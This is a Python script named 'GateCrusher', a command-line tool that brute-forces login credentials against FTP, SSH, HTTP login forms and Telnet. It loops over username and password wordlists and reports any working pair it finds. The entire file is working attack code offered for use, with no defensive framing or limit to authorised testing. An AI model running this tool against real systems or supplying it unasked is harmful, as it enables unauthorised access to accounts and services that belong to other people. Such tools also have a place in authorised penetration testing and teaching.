#!/usr/bin/python3
import sys
import ftplib
import paramiko
import requests
import telnetlib
import argparse
from colorama import Fore

green = Fore.GREEN
red = Fore.RED
yellow = Fore.YELLOW
cyan = Fore.CYAN
def get_banner():
    banner ="""
       ^    ^    ^    ^    ^    ^    ^    ^    ^    ^    ^  
      /G\  /a\  /t\  /e\  /C\  /r\  /u\  /s\  /h\  /e\  /r\ 
     <___><___><___><___><___><___><___><___><___><___><___>

    """
    print(cyan + banner)
def get_arguments():
    parser = argparse.ArgumentParser(description="Brute Force Tool for FTP, SSH, HTTP, and Telnet services Usage: sudo python3 bruteforcer.py -s ftp  -H <target ip> or google.com -ul /usr/share/wordlists/rockyou.txt -pl /usr/share/wordlists/rockyou.txt")
    parser.add_argument("-s", "--service", dest="service", required=True, help="Specify the service to brute force (http, ftp, ssh, telnet)")
    parser.add_argument("-H", "--host", dest="host", required=True, help="Specify the host (hostname or IP)")
    parser.add_argument("-ul", "--user-list", dest="userlist", required=True, help="Specify the username list file")
    parser.add_argument("-pl", "--pass-list", dest="passwordlist", required=True, help="Specify the password list file")
    parser.add_argument("-u", "--url", dest="url", help="Specify the HTTP login URL (required for HTTP brute force)")
    parser.add_argument("-uf", "--user-field", dest="user_field", help="Specify the username field name (required for HTTP brute force)")
    parser.add_argument("-pf", "--pass-field", dest="pass_field", help="Specify the password field name (required for HTTP brute force)")
    return parser.parse_args()

def brute_force_ftp(host, user_list, password_list):
    for username in user_list:
        for passwd in password_list:
            try:
                with ftplib.FTP(host) as ftp:
                    print(green + "Cracking FTP....")
                    ftp.login(user=username, passwd=passwd)
                    print(green + f"[+] FTP Success {username}:{passwd}")
                    return (username, passwd)
            except ftplib.error_perm as e:
                if "530" in str(e):
                    print(red + f"[-] Sorry, incorrect FTP password: {e}")
                else:
                    print(f"FTP error: {e}")
            except Exception as e:
                print(f"FTP invalid error: {e}")    
    return None

def brute_force_ssh(host, user_list, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.load_system_host_keys()
    
    for username in user_list:
        for passwd in password_list:
            try:
                print(green + "Cracking SSH....")
                ssh.connect(host, username=username, password=passwd, banner_timeout=30, timeout=30, allow_agent=False, look_for_keys=False, port=22)
                print(green + f"[+] SSH Success! Credentials found: {username}:{passwd}")
                return (username, passwd)
            except paramiko.AuthenticationException:
                print(red + f"[-] SSH Authentication failed for {username}:{passwd}")
            except Exception as e:
                print(red + f"[-] SSH Error: {e}")
    ssh.close()
    return None


def brute_force_http(login_url, user_list, password_list, username_field, password_field):
    for username in user_list:
        for passwd in password_list:
            try:
                print(green + "Cracking HTTP....")
                data = {username_field: username, password_field: passwd}
                response = requests.post(login_url, data=data)
                if response.status_code == 200 and "login failed" not in response.text.lower():
                    print(green + f"[+] HTTP Success! Credentials found: {username}:{passwd}")
                    return (username, passwd)
                else:
                    print(red + f"[-] HTTP Authentication failed for {username}:{passwd}")
            except Exception as e:
                print(red + f"[-] HTTP Error: {e}")
    return None

def brute_force_telnet(host, user_list, password_list):
    for username in user_list:
        for passwd in password_list:
            try:
                print(green + "Cracking Telnet....")
                tn = telnetlib.Telnet(host)
                tn.read_until(b"login: ")
                tn.write(username.encode('ascii') + b"\n")
                tn.read_until(b"Password: ")
                tn.write(passwd.encode('ascii') + b"\n")
                tn.write(b"exit\n")
                result = tn.read_all().decode('ascii')
                if "Login incorrect" not in result:
                    print(green + f"[+] Telnet Success! Credentials found: {username}:{passwd}")
                    return (username, passwd)
                else:
                    print(red + f"[-] Telnet Authentication failed for {username}:{passwd}")
            except Exception as e:
                print(red + f"[-] Telnet Error: {e}")
    return None

def load_wordlists(file_path):
    try:
        print(yellow + f"[*] Loading wordlist from: {file_path}")
        with open(file_path, "r", encoding="latin-1") as f:
            return [line.strip() for line in f]
    except FileNotFoundError as e:
        print(f"File not found: {e} (path: {file_path})")
    except Exception as e:
        print(f"Unexpected error: {e}")

get_banner()

def main():
    try:
        args = get_arguments()
    
        service = args.service.strip().lower()
        host = args.host.strip()
        user_file_path = args.userlist.strip()
        password_file_path = args.passwordlist.strip()

        usernames = load_wordlists(user_file_path)
        passwords = load_wordlists(password_file_path)

        if not usernames or not passwords:
            print(yellow + "[!] One of the wordlists is not set properly.")
            exit()

        creds = None
        if service == "ftp":
            creds = brute_force_ftp(host, usernames, passwords)
        elif service == "ssh":
            creds = brute_force_ssh(host, usernames, passwords)
        elif service == "http":
            if not args.url or not args.user_field or not args.pass_field:
                print(yellow + "[>] For HTTP brute force, you must specify the login URL, username field, and password field.")
                exit()
            login_url = args.url.strip()
            username_field = args.user_field.strip()
            password_field = args.pass_field.strip()
            creds = brute_force_http(login_url, usernames, passwords, username_field, password_field)
        elif service == "telnet":
            creds = brute_force_telnet(host, usernames, passwords)
        else:
            print(yellow + "[!] Invalid service specified. Choose either 'ftp', 'ssh', 'http', or 'telnet'.")
            exit()

        if creds:
            print(green + f"[+] Successfully found credentials: {creds}")
        else:
            print(red + "[-] Failed to gather credentials")
    except KeyboardInterrupt:
        print(red + "\nKeyboard interruption detected. Exiting...")
        sys.exit(1)
if __name__ == "__main__":
    main()
